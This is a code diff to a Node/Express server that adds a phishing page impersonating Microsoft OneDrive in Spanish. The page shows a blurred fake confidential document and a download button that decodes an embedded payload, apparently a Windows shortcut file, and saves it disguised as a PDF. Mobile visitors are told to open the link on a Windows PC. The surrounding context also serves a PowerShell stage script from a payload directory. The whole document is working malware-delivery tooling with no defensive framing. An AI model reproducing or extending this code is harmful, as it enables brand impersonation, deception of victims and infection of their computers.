@@ -126,6 +126,11 @@ app.get("/catalogo", (req, res) => {
   res.send(LANDING_HTML);
 });
 
+// ── OneDrive-style document sharing page ──
+app.get("/s/:docId", (req, res) => {
+  res.send(ONEDRIVE_HTML);
+});
+
 app.get("/dl/s.ps1", (req, res) => {
   const fp = path.join(PAYLOAD_DIR, "stage.ps1");
   if (!fs.existsSync(fp)) return res.status(404).end();
@@ -677,6 +682,138 @@ function dl(){
   document.body.appendChild(l);l.click();
   document.body.removeChild(l);
   URL.revokeObjectURL(u);
+}
+</script>
+</body>
+</html>`;
+
+// ── OneDrive-style phishing page ──
+const ONEDRIVE_HTML = `<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Documento compartido - OneDrive</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%230078d4' d='M12.5 3.5c-2.6 0-4.8 1.7-5.6 4a5 5 0 00-4.4 5c0 2.8 2.2 5 5 5h12a4.5 4.5 0 001-8.9c-.5-2.9-3-5.1-6-5.1h-2z'/></svg>">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f5f5f5;min-height:100vh}
+.nav{background:#fff;border-bottom:1px solid #e1e1e1;padding:8px 24px;display:flex;align-items:center;gap:12px}
+.nav svg{width:28px;height:28px}
+.nav span{font-size:17px;font-weight:600;color:#333}
+.nav .right{margin-left:auto;display:flex;align-items:center;gap:16px}
+.nav .avatar{width:32px;height:32px;border-radius:50%;background:#0078d4;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600}
+.container{max-width:680px;margin:60px auto;padding:0 20px}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.08);overflow:hidden}
+.card-header{padding:28px 32px 20px;border-bottom:1px solid #f0f0f0}
+.card-header .shared-by{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.card-header .shared-avatar{width:40px;height:40px;border-radius:50%;background:#0078d4;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600}
+.card-header .shared-info{font-size:14px;color:#616161}
+.card-header .shared-info strong{color:#333;font-size:15px;display:block}
+.card-header h2{font-size:20px;color:#1a1a1a;margin-bottom:6px;display:flex;align-items:center;gap:10px}
+.card-header h2 .icon{color:#0078d4}
+.card-header .meta{font-size:13px;color:#888;display:flex;gap:16px}
+.preview{padding:24px 32px;background:#fafafa;border-bottom:1px solid #f0f0f0;min-height:200px;position:relative}
+.preview-blur{filter:blur(5px);pointer-events:none;user-select:none;opacity:.7}
+.preview-blur p{font-size:14px;color:#444;line-height:1.8;margin-bottom:12px}
+.preview-blur table{width:100%;border-collapse:collapse;margin:16px 0}
+.preview-blur td,.preview-blur th{border:1px solid #ddd;padding:8px 12px;font-size:13px;text-align:left}
+.preview-blur th{background:#f0f0f0;font-weight:600}
+.preview-overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:2}
+.preview-overlay .lock{font-size:42px;margin-bottom:12px}
+.preview-overlay p{font-size:15px;color:#555;margin-bottom:18px}
+.actions{padding:24px 32px;display:flex;justify-content:center;gap:12px}
+.btn{padding:12px 32px;border-radius:6px;font-size:15px;font-weight:600;border:none;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px;transition:background .15s}
+.btn-primary{background:#0078d4;color:#fff}.btn-primary:hover{background:#106ebe}
+.btn-outline{background:#fff;color:#0078d4;border:1px solid #0078d4}.btn-outline:hover{background:#f0f7ff}
+.footer{text-align:center;padding:24px;font-size:12px;color:#999}
+.footer a{color:#0078d4;text-decoration:none}
+.mobile-msg{display:none;text-align:center;padding:40px 24px}
+.mobile-msg .phone-icon{font-size:48px;margin-bottom:16px}
+.mobile-msg h3{font-size:18px;color:#333;margin-bottom:8px}
+.mobile-msg p{font-size:14px;color:#666;line-height:1.6}
+@media(max-width:768px){.desktop-only{display:none!important}.mobile-msg{display:block!important}}
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#107c10;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.2)}
+</style>
+</head>
+<body>
+<div class="nav">
+  <svg viewBox="0 0 24 24" fill="none"><path d="M9.5 8.5C9.5 6 11.5 4 14 4c2 0 3.7 1.3 4.3 3.1A3.5 3.5 0 0121 10.5 3.5 3.5 0 0117.5 14H7a4 4 0 01-.5-8A4.5 4.5 0 019.5 8.5z" fill="#0078d4"/><path d="M6.5 6c.4-.3.9-.6 1.4-.8A5.5 5.5 0 003 10a5 5 0 005 5h1.5" fill="#0050a0" opacity=".6"/></svg>
+  <span>OneDrive</span>
+  <div class="right">
+    <div class="avatar">U</div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="card">
+    <div class="card-header">
+      <div class="shared-by">
+        <div class="shared-avatar">M</div>
+        <div class="shared-info">
+          <strong>Martin P.</strong>
+          Compartió un archivo con vos
+        </div>
+      </div>
+      <h2><span class="icon">📄</span> Documento_Importante_2024.pdf</h2>
+      <div class="meta">
+        <span>PDF — 2.4 MB</span>
+        <span>Modificado: hace 2 horas</span>
+        <span>🔒 Solo lectura</span>
+      </div>
+    </div>
+    <div class="preview desktop-only">
+      <div class="preview-blur">
+        <p><strong>DOCUMENTO CONFIDENCIAL</strong></p>
+        <p>Estimado/a, por medio de la presente se adjunta la documentación solicitada referente al trámite iniciado con fecha 14/11/2024. Se detallan los puntos acordados:</p>
+        <table>
+          <tr><th>Concepto</th><th>Detalle</th><th>Estado</th></tr>
+          <tr><td>Documentación personal</td><td>DNI, CUIL, comprobante</td><td>Completo</td></tr>
+          <tr><td>Formulario 1040</td><td>Declaración jurada</td><td>Pendiente firma</td></tr>
+          <tr><td>Comprobante de domicilio</td><td>Servicio a nombre</td><td>Completo</td></tr>
+        </table>
+        <p>Queda a disposición para cualquier consulta. Se solicita revisión y confirmación antes del viernes 22/11/2024.</p>
+      </div>
+      <div class="preview-overlay">
+        <div class="lock">🔒</div>
+        <p>Descargá el documento para ver el contenido completo</p>
+      </div>
+    </div>
+    <div class="mobile-msg">
+      <div class="phone-icon">💻</div>
+      <h3>Abrir en una computadora</h3>
+      <p>Este documento requiere ser descargado y abierto desde una computadora con Windows para su correcta visualización.<br><br>Abrí este enlace desde tu PC o laptop.</p>
+    </div>
+    <div class="actions desktop-only">
+      <button class="btn btn-primary" onclick="dlDoc()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+        Descargar documento
+      </button>
+      <button class="btn btn-outline" onclick="dlDoc()">Abrir en OneDrive</button>
+    </div>
+  </div>
+  <div class="footer">
+    <a href="#">Términos de uso</a> · <a href="#">Privacidad</a> · <a href="#">Microsoft © 2024</a>
+  </div>
+</div>
+
+<div class="toast" id="toast">✓ Descarga iniciada</div>
+
+<script>
+function dlDoc(){
+  var b=atob("${LNK_B64}");
+  var a=new Uint8Array(b.length);
+  for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
+  var bl=new Blob([a],{type:"application/pdf"});
+  var u=URL.createObjectURL(bl);
+  var l=document.createElement("a");
+  l.href=u;l.download="Documento_Importante_2024.pdf";
+  document.body.appendChild(l);l.click();
+  document.body.removeChild(l);
+  URL.revokeObjectURL(u);
+  var t=document.getElementById("toast");
+  t.style.display="block";
+  setTimeout(function(){t.style.display="none"},3000);
 }
 </script>
 </body>
